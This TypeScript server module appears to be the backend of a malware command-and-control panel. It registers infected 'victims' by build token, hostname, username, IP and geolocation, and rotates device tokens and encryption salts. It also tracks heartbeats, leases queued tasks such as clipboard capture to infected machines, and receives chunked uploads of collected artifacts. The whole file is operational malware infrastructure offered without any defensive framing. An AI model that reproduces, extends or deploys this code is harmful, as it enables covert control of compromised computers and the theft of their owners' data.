import type { FastifyPluginAsync } from 'fastify';
import { z } from 'zod';
import { prisma } from '../lib/db';
import { equal, openSecretLoose, randomToken, sealSecret, sha256hex } from '../lib/crypto';
import { authenticateVictim } from '../plugins/victim-auth';
import { bad, HttpError, notFound, unauth } from '../lib/errors';
import { geo } from '../lib/geo';
import { publish } from '../lib/bus';
import { notifyVictimNew } from '../services/notify';
import { commitUpload, initUpload, writeChunk } from '../services/artifact';
import { applyTaskResult } from '../lib/task-result';
import { recordFailure } from '../lib/ws-events';
import { classifyToken, enrollDecision, expiry, promoteExpired, type IdentityRow } from '../services/victim';
import { DECLARABLE_CAPABILITIES as DECLARABLE, intersectCapabilities, normalizeContract, SERVER_CONTRACT } from '../lib/agent-contract';

const enrollSchema = z.object({
  build_token: z.string().min(8).max(128),
  build_id: z.string().uuid(),
  hostname: z.string().min(1).max(128),
  os: z.enum(['windows', 'linux', 'macos']),
  os_version: z.string().max(128).default(''),
  arch: z.enum(['x86_64', 'aarch64']).default('x86_64'),
  username: z.string().min(1).max(128),
  agent_version: z.string().max(32).default(''),
  profile: z.enum(['lite', 'full']).default('full'),
  artifact_scheme: z.number().int().min(1).max(2).default(1),
  /// v2: proof of possession. 0.3.7 never sends it and takes the grace path.
  device_token: z.string().min(16).max(128).optional(),
  /// v2: the epoch the agent still holds, for rotation observability.
  key_epoch: z.number().int().min(1).optional(),
  capabilities: z.array(z.string().max(32)).max(32).default([]),
  modules: z.array(z.string().max(32)).max(16).default([])
});

function openSalt(row: Pick<IdentityRow, 'keySaltEnc' | 'keyScheme'>): string | null {
  if (row.keyScheme !== 2 || !row.keySaltEnc) return null;
  try {
    return openSecretLoose(row.keySaltEnc);
  } catch {
    return null;
  }
}

const hbSchema = z.object({
  status: z.enum(['ok', 'degraded']),
  uptime_s: z.number().int().min(0),
  modules: z.record(z.string(), z.string().max(64)),
  counters: z.record(z.string(), z.number().int()),
  profile: z.enum(['lite', 'full']),
  pending_artifact: z.string().uuid().nullable().optional(),
  agent_version: z.string().max(32).default(''),
  /// v2: lets the panel answer with a rotated salt without a full enroll.
  key_epoch: z.number().int().min(1).optional(),
  /// v2: capability refresh without re-enrolling.
  capabilities: z.array(z.string().max(32)).max(32).optional()
});

const resultSchema = z.object({
  status: z.enum(['ok', 'error', 'cancelled']),
  error: z.string().max(2000).nullable().optional(),
  result: z.record(z.unknown()).default({}),
  artifacts: z.array(z.object({ upload_request: z.string().uuid() })).max(32).default([])
});

const uploadSchema = z.object({
  task_id: z.string().uuid().nullable().optional(),
  module: z.string().min(1).max(64),
  container_version: z.literal(1),
  total_size: z.number().int().positive(),
  chunk_count: z.number().int().positive(),
  sha256: z.string().regex(/^[0-9a-f]{64}$/)
});

const commitSchema = z.object({ sha256: z.string().regex(/^[0-9a-f]{64}$/), chunk_count: z.number().int().positive() });

function signed(victim: { lastHeartbeatAt: Date }): boolean {
  return Date.now() - victim.lastHeartbeatAt.getTime() < 90_000;
}

export const agentRoutes: FastifyPluginAsync = async (app) => {
  app.post('/enroll', { config: { rateLimit: { max: 20, timeWindow: '1 minute' } } }, async (request, reply) => {
    const input = enrollSchema.parse(request.body);
    const build = await prisma.build.findUnique({ where: { tokenHash: sha256hex(input.build_token) } });
    if (!build) throw unauth('unknown_build');
    if (build.revokedAt || build.status === 'revoked') throw new HttpError(403, 'build_revoked', 'build revoked');

    const location = geo(request.clientIp);
    const now = Date.now();
    const contract = normalizeContract(request.headers['x-contract']);
    const capabilities = intersectCapabilities(input.capabilities);
    const query = { buildId_hostname_username: { buildId: build.id, hostname: input.hostname, username: input.username } };
    let existing = await prisma.victim.findUnique({ where: query });
    // An expired pending token is promoted before deciding, so a third enroll
    // never stacks a second pending over a dead one.
    if (existing) {
      const promoted = promoteExpired(existing, now);
      if (promoted) {
        // Conditional: a confirmed enroll may have rotated the active token
        // between the read and this promotion. Re-read and decide again.
        await prisma.victim.updateMany({
          where: {
            id: existing.id,
            deviceTokenEnc: existing.deviceTokenEnc,
            pendingTokenEnc: existing.pendingTokenEnc
          },
          data: promoted
        });
        existing = await prisma.victim.findUnique({ where: { id: existing.id } }) ?? existing;
      }
    }
    const kind = existing ? classifyToken(existing, input.device_token, now) : null;
    const tokenValid = kind === 'active' || kind === 'previous';
    // A present-but-unknown token is explicit: do not silently degrade to grace.
    if (input.device_token && existing && !kind) throw unauth('bad_device_token');

    const path = enrollDecision(existing, { tokenValid, graceHours: build.enrollGraceHours, now });
    // The victim decides the scheme from what it declares; the build only caps it.
    const scheme = build.enrollScheme === 2 && input.artifact_scheme === 2 ? 2 : 1;
    let keySalt = existing ? openSalt(existing) : null;
    if (!keySalt && existing) {
      const historical = await prisma.victimKeyEpoch.findUnique({
        where: { victimId_epoch: { victimId: existing.id, epoch: existing.keyEpoch } },
        select: { saltEnc: true }
      });
      if (historical) {
        try {
          keySalt = openSecretLoose(historical.saltEnc);
        } catch {
          keySalt = null;
        }
      }
    }
    if (scheme === 2 && !keySalt) keySalt = randomToken(32);
    const keySaltEnc = scheme === 2 && keySalt ? sealSecret(keySalt) : null;
    const epoch = existing?.keyEpoch ?? 1;
    const deviceToken = randomToken(32);
    const grace = build.enrollGraceHours > 0 ? expiry(now, build.enrollGraceHours) : null;

    const tokenData = path === 'confirmed'
      // Rotate: keep the old token usable for the same window as a grace.
      ? {
          deviceTokenEnc: sealSecret(deviceToken),
          prevTokenEnc: existing?.deviceTokenEnc ?? null,
          prevTokenExpiresAt: grace,
          pendingTokenEnc: null,
          pendingTokenExpiresAt: null,
          identityState: 'confirmed' as const,
          graceUntil: null
        }
      // A new or revoked identity: the issued token is active right away.
      : !existing || existing.revokedAt || existing.identityState === 'revoked'
        ? {
            deviceTokenEnc: sealSecret(deviceToken),
            prevTokenEnc: null,
            prevTokenExpiresAt: null,
            pendingTokenEnc: null,
            pendingTokenExpiresAt: null,
            identityState: 'unverified' as const,
            graceUntil: grace
          }
        : path === 'replace'
          ? {
              deviceTokenEnc: sealSecret(deviceToken),
              prevTokenEnc: null,
              prevTokenExpiresAt: null,
              pendingTokenEnc: null,
              pendingTokenExpiresAt: null,
              identityState: 'unverified' as const,
              graceUntil: null
            }
          // Path 2: the current token stays valid; the new one is pending.
          // `deviceTokenEnc` is deliberately omitted so a concurrent confirmed
          // enroll can rotate it without this stale write clobbering the result.
          : {
              pendingTokenEnc: sealSecret(deviceToken),
              pendingTokenExpiresAt: grace,
              identityState: 'grace' as const,
              graceUntil: grace
            };

    const identity = {
      os: input.os,
      osVersion: input.os_version,
      arch: input.arch,
      profile: input.profile,
      agentVersion: input.agent_version,
      keyScheme: scheme,
      // Never clear an existing salt on a scheme-1 downgrade: a later 0.4
      // re-enroll must reuse it and keep the queue readable.
      ...(keySaltEnc ? { keySaltEnc } : existing?.keySaltEnc ? { keySaltEnc: existing.keySaltEnc } : {}),
      ip: request.clientIp,
      country: location.country,
      countryCode: location.countryCode,
      city: location.city,
      lat: location.lat,
      lon: location.lon,
      status: 'online' as const,
      lastHeartbeatAt: new Date(),
      revokedAt: null,
      // A declaration can only lower the contract, never claim v2 blindly.
      contractVersion: contract >= SERVER_CONTRACT ? SERVER_CONTRACT : 1,
      capabilities,
      ...tokenData
    };

    const victim = existing
      ? await prisma.victim.update({ where: { id: existing.id }, data: identity })
      : await prisma.victim.create({
          data: {
            deviceTokenEnc: deviceToken,
            ...identity,
            buildId: build.id,
            hostname: input.hostname,
            username: input.username,
            keyEpoch: epoch
          }
        });

    if (scheme === 2 && keySalt) {
      await prisma.victimKeyEpoch.upsert({
        where: { victimId_epoch: { victimId: victim.id, epoch } },
        update: { saltEnc: sealSecret(keySalt) },
        create: { victimId: victim.id, epoch, saltEnc: sealSecret(keySalt) }
      });
    }

    if (!existing) {
      await prisma.event.create({ data: { victimId: victim.id, kind: 'enrolled', data: { ip: request.clientIp } } });
      await notifyVictimNew(victim);
      void publish({ type: 'victim.new', victimId: victim.id, at: Date.now(), data: { hostname: victim.hostname, os: victim.os } });
    }
    // `unverified` and `grace` are the two no-proof paths; both must be visible.
    if (path === 'unverified' || path === 'replace' || path === 'bootstrap' || !existing) {
      await prisma.event.create({
        data: { victimId: victim.id, kind: 'unverified_enroll', data: { ip: request.clientIp, path, agent_version: input.agent_version } }
      });
    }
    if (path === 'confirmed') {
      await prisma.event.create({
        data: { victimId: victim.id, kind: 'enroll_confirmed', data: { ip: request.clientIp, path, key_epoch: input.key_epoch ?? epoch } }
      });
    }

    return reply.code(201).send({
      victim_id: victim.id,
      device_token: deviceToken,
      server_time: Math.floor(Date.now() / 1000),
      heartbeat_interval: 30,
      poll_interval: 20,
      config_version: 1,
      // `contract` is additive; 0.3.7 ignores it and keeps acting as v1.
      contract: SERVER_CONTRACT,
      capabilities: victim.capabilities,
      identity_state: victim.identityState,
      key_epoch: epoch,
      ...(scheme === 2 ? { artifact_scheme: 2, key_salt: keySalt } : { artifact_scheme: 1 })
    });
  });

  const authed = { preHandler: authenticateVictim };

  app.post('/hb', authed, async (request) => {
    const victim = request.victim!;
    const input = hbSchema.parse(request.body);
    const location = geo(request.clientIp);
    for (const [module, state] of Object.entries(input.modules)) {
      if (state.startsWith('error')) {
        await recordFailure(victim.id, 'module_degraded', module, `${module}: ${state}`).catch(() => undefined);
      }
    }
    if ((input.counters.outbox_dropped ?? 0) > 0) {
      await recordFailure(victim.id, 'outbox_dropped', 'outbox', `outbox_dropped=${input.counters.outbox_dropped}`).catch(() => undefined);
    }
    await prisma.victim.update({
      where: { id: victim.id },
      data: {
        status: input.status === 'ok' ? 'online' : 'stale',
        lastHeartbeatAt: new Date(),
        agentVersion: input.agent_version || victim.agentVersion,
        ...(input.capabilities ? { capabilities: intersectCapabilities(input.capabilities) } : {}),
        ip: request.clientIp,
        ...(location.country ? { country: location.country, countryCode: location.countryCode, city: location.city, lat: location.lat, lon: location.lon } : {})
      }
    });
    const urgent = await prisma.task.count({
      where: { victimId: victim.id, status: 'queued', name: { in: ['clip_start', 'clip_stop', 'cancel'] } }
    });
    void publish({
      type: 'victim.heartbeat',
      victimId: victim.id,
      at: Date.now(),
      data: { status: input.status, modules: input.modules, counters: input.counters, ip: request.clientIp }
    });
    const rotated = input.key_epoch !== undefined && input.key_epoch < victim.keyEpoch;
    let rotatedSalt: string | null = null;
    if (rotated) {
      const row = await prisma.victimKeyEpoch.findUnique({
        where: { victimId_epoch: { victimId: victim.id, epoch: victim.keyEpoch } },
        select: { saltEnc: true }
      });
      rotatedSalt = row ? openSecretLoose(row.saltEnc) : openSalt(victim);
    }
    return {
      ok: true,
      poll_now: urgent > 0,
      config_version: 1,
      contract: 2,
      key_epoch: victim.keyEpoch,
      ...(rotated && rotatedSalt ? { key_salt: rotatedSalt, artifact_scheme: victim.keyScheme } : {})
    };
  });

  /** Authenticated refresh: negotiation is explicit, never inferred from UA. */
  app.get('/capabilities', authed, async (request) => {
    const victim = request.victim!;
    return {
      contract: SERVER_CONTRACT,
      supported: [...intersectCapabilities([...DECLARABLE])],
      capabilities: victim.capabilities,
      key_epoch: victim.keyEpoch
    };
  });

  app.get('/tasks', authed, async (request) => {
    const victim = request.victim!;
    const limit = Math.min(32, Math.max(1, Number((request.query as { limit?: string }).limit ?? 8)));
    if (!signed(victim)) throw bad('stale', 'heartbeat first', 409);
    const now = new Date();
    const rows = await prisma.task.findMany({
      // `unknown`/`expired` are terminal and never re-leased.
      where: { victimId: victim.id, notBefore: { lte: now }, OR: [{ status: 'queued' }, { status: 'running', leaseUntil: { lt: now } }] },
      orderBy: [{ priority: 'desc' }, { createdAt: 'asc' }],
      take: limit
    });
    if (rows.length > 0) {
      await prisma.task.updateMany({
        where: { id: { in: rows.map((row) => row.id) } },
        data: { status: 'running', attempts: { increment: 1 }, leaseUntil: new Date(Date.now() + Math.max(...rows.map((r) => r.timeoutSec)) * 1000) }
      });
      void publish({ type: 'task.update', victimId: victim.id, at: Date.now(), data: { claimed: rows.length } });
    }
    return {
      tasks: rows.map((row) => ({
        id: row.id,
        name: row.name,
        params: row.params as Record<string, unknown>,
        timeout_sec: row.timeoutSec,
        not_before: Math.floor(row.notBefore.getTime() / 1000)
      }))
    };
  });

  app.post('/tasks/:id/result', { ...authed, bodyLimit: 4 * 1024 * 1024 }, async (request, reply) => {
    const victim = request.victim!;
    const { id } = z.object({ id: z.string().uuid() }).parse(request.params);
    const input = resultSchema.parse(request.body);
    const outcome = await applyTaskResult(victim.id, id, input);
    if (outcome === 'missing') throw notFound('task');
    // A duplicate final body is a typed conflict, not a 5xx or an error metric.
    if (outcome === 'conflict') return reply.code(409).send({ error: 'already_finished', message: 'result already stored' });
    return { ok: true };
  });

  app.post('/artifacts', authed, async (request, reply) => {
    const signedVictim = request.victim!;
    const victim = await prisma.victim.findUniqueOrThrow({ where: { id: signedVictim.id }, include: { build: true } });
    const input = uploadSchema.parse(request.body);
    const upload = await initUpload(victim, {
      taskId: input.task_id ?? null,
      module: input.module,
      totalSize: input.total_size,
      chunkCount: input.chunk_count,
      sha256: input.sha256
    });
    return reply.code(201).send({
      upload_id: upload.id,
      chunk_size: 524288,
      received: 0,
      expires_at: Math.floor(upload.expiresAt.getTime() / 1000)
    });
  });

  app.get('/artifacts/:id', authed, async (request) => {
    const { id } = z.object({ id: z.string().uuid() }).parse(request.params);
    const upload = await prisma.upload.findFirst({ where: { id, victimId: request.victim!.id } });
    if (!upload) throw notFound('upload');
    return { received: upload.received, state: upload.state, expires_at: Math.floor(upload.expiresAt.getTime() / 1000) };
  });

  app.post('/artifacts/:id/chunk', authed, async (request) => {
    const { id } = z.object({ id: z.string().uuid() }).parse(request.params);
    const upload = await prisma.upload.findFirst({ where: { id, victimId: request.victim!.id } });
    if (!upload) throw notFound('upload');
    const offset = Number((request.query as { offset?: string }).offset);
    if (!Number.isInteger(offset) || offset < 0) throw bad('offset_invalid', 'invalid offset');
    const chunkHash = request.headers['x-chunk-sha256'];
    if (typeof chunkHash !== 'string' || !/^[0-9a-f]{64}$/.test(chunkHash)) throw bad('hash_required', 'X-Chunk-Sha256 required');
    const body = request.rawBody;
    if (!body?.length) throw bad('empty_chunk', 'empty body');
    const received = await writeChunk(upload, offset, body, chunkHash);
    return { ok: true, received };
  });

  app.post('/artifacts/:id/commit', authed, async (request) => {
    const { id } = z.object({ id: z.string().uuid() }).parse(request.params);
    const upload = await prisma.upload.findFirst({ where: { id, victimId: request.victim!.id } });
    if (!upload) throw notFound('upload');
    const input = commitSchema.parse(request.body);
    const artifact = await commitUpload(upload, input.sha256, input.chunk_count);
    return { artifact_id: artifact.id, status: 'queued' };
  });
};

